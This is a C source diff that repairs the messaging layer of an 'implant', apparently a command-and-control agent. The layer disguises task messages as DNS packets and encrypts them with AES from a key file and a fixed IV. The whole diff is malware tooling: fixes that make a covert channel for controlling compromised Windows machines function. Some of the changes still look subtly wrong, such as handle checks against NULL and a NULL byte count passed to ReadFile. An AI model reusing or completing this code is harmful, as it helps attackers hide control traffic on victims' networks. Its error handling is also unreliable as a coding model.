@@ -82,7 +82,7 @@ BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength,
 
 	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
 	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
-	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), &payload, payloadLength);
+	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
 
 	EncodeDNS(&msg, taskId, type, &payloadLength, payload);
 
@@ -99,7 +99,7 @@ BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength,
 BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 {
 	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
-	PBYTE* out = NULL;
+	PBYTE out = NULL;
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(msg != NULL);
 
@@ -113,7 +113,7 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 		return FALSE;
 	}
 
-	DecodeDNS(buff, out);
+	DecodeDNS(buff, &out);
 
 	msg->type = *(DWORD*)(out + TLV_TYPE_FIELD_OFFSET);
 	msg->length = *(DWORD*)(out + TLV_LENGTH_FIELD_OFFSET);
@@ -133,16 +133,10 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 			return FALSE;
 		}
 
-		if (!memcpy(msg->value,
+		memcpy(msg->value,
 			out + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
 			msg->length
-			))
-		{
-			ImplantHeapFree(msg->value);
-			ImplantHeapFree(buff);
-			msg->value = NULL;
-			return FALSE;
-		}
+		);
 	}
 
 	ImplantHeapFree(buff);
@@ -170,16 +164,16 @@ BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYT
 	length = (USHORT)*payloadLength;
 
 	//memcpy(dest, src, size);
-	memcpy(msg, &taskId, sizeof(USHORT));
-	memcpy(msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
-	memcpy(msg + DNS_LENGTH_OFFSET, &length, sizeof(USHORT));
-	memcpy(msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
-	memcpy(msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
-	memcpy(msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
+	memcpy(*msg, &taskId, sizeof(USHORT));
+	memcpy(*msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
+	memcpy(*msg + DNS_LENGTH_OFFSET, &length, sizeof(USHORT));
+	memcpy(*msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
+	memcpy(*msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
+	memcpy(*msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
 
 	Encrypt(&payload, *payloadLength + TLV_HEADER_SIZE);
 
-	memcpy(msg + DNS_HEADER_SIZE, payload, *payloadLength);
+	memcpy(*msg + DNS_HEADER_SIZE, payload, *payloadLength);
 
 	*payloadLength = (DWORD)(length + DNS_HEADER_SIZE);
 
@@ -206,6 +200,9 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 	PBYTE temp = *msg;
 	ULONG sizeRequired = 0;
 	HANDLE keyFile = NULL;
+	UCHAR ivBuff[IV_SIZE] = { 0 };
+	BOOL ret = TRUE;
+	memcpy(ivBuff, IV, IV_SIZE);
 
 	if (status != STATUS_SUCCESS)
 	{
@@ -225,77 +222,133 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 		return FALSE;
 	}
 
-	if (!CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL))
+	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (keyFile == INVALID_HANDLE_VALUE)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
 	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
-	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
+	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
-	status = BCryptEncrypt(hKey, temp, msgLength, NULL, NULL, 0, NULL, 0, &sizeRequired, BCRYPT_BLOCK_PADDING);
+	status = BCryptEncrypt(hKey, temp, msgLength, NULL, ivBuff, IV_SIZE, NULL, 0, &sizeRequired, BCRYPT_BLOCK_PADDING);
 	*msg = ImplantHeapAlloc(sizeRequired);
-	status = BCryptEncrypt(hKey, temp, msgLength, NULL, NULL, 0, *msg, sizeRequired, &sizeRequired, BCRYPT_BLOCK_PADDING);
+	status = BCryptEncrypt(hKey, temp, msgLength, NULL, ivBuff, IV_SIZE, *msg, sizeRequired, &sizeRequired, BCRYPT_BLOCK_PADDING);
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
-	ImplantHeapFree(temp);
 
-	return TRUE;
+cleanup:
+	if (hAlg != NULL)
+	{
+		BCryptCloseAlgorithmProvider(hAlg, 0);
+	}
+	if (hKey != NULL)
+	{
+		BCryptDestroyKey(hKey);
+	}
+	if (ret == FALSE)
+	{
+		ImplantHeapFree(buff);
+	}
+	else
+	{
+		ImplantHeapFree(temp);
+	}
+	if (keyFile != NULL)
+	{
+		CloseHandle(keyFile);
+	}
+
+	return ret;
 }
 
 BOOL Decrypt(PBYTE msg, DWORD* msgLength) {
-	NTSTATUS status;
 	BCRYPT_ALG_HANDLE hAlg = NULL;
+	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
 	BCRYPT_KEY_HANDLE hKey = NULL;
 	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
 	ULONG sizeRequired = 0;
 	HANDLE keyFile = NULL;
+	BOOL ret = TRUE;
+	UCHAR ivBuff[IV_SIZE] = { 0 };
+	memcpy(ivBuff, IV, IV_SIZE);
+
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (keyFile == INVALID_HANDLE_VALUE)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
 
 	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
-	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
+	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
-	status = BCryptDecrypt(hKey, msg, *msgLength, NULL, NULL, 0, NULL, 0, &sizeRequired, 0);
+	status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, NULL, 0, &sizeRequired, 0);
 	if (status != STATUS_SUCCESS)
 	{
-		ImplantHeapFree(buff);
-		return FALSE;
+		ret = FALSE;
+		goto cleanup;
 	}
 
 	if (sizeRequired <= *msgLength)
 	{
 
-		status = BCryptDecrypt(hKey, msg, *msgLength, NULL, NULL, 0, msg, sizeRequired, &sizeRequired, 0);
+		status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, msg, sizeRequired, &sizeRequired, 0);
 		if (status != STATUS_SUCCESS)
 		{
-			ImplantHeapFree(buff);
-			return FALSE;
+			ret = FALSE;
+			goto cleanup;
 		}
 		*msgLength = sizeRequired;
 	}
 
-	return TRUE;
+cleanup:
+	if (hAlg != NULL)
+	{
+		BCryptCloseAlgorithmProvider(hAlg, 0);
+	}
+	if (hKey != NULL)
+	{
+		BCryptDestroyKey(hKey);
+	}
+	if (buff != NULL)
+	{
+		ImplantHeapFree(buff);
+	}
+	if (keyFile != NULL)
+	{
+		CloseHandle(keyFile);
+	}
+	
+	return ret;
 }
